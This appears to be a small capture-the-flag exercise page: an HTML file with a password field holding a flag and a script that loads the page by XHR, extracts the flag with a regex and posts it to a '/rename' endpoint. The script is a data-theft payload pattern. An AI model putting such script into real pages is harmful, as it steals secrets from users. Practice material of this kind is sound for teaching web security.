<html>

<body>
    <div>
        <p>Getting me by XHR</p>
        <input type=password name="secret" value="flag{U gets me}" />
    </div>
</body>

<script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/index.html',true);
    req.send();
    
    function handleResponse() {
        var secret = this.responseText.match(/flag\{.*\}/);
        console.log(secret);
        
        // post
        var req = new XMLHttpRequest();
        req.open('post', '/rename', true);
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        req.send('secret='+secret);
        console.log(req.status);
    }
</script>


</html>
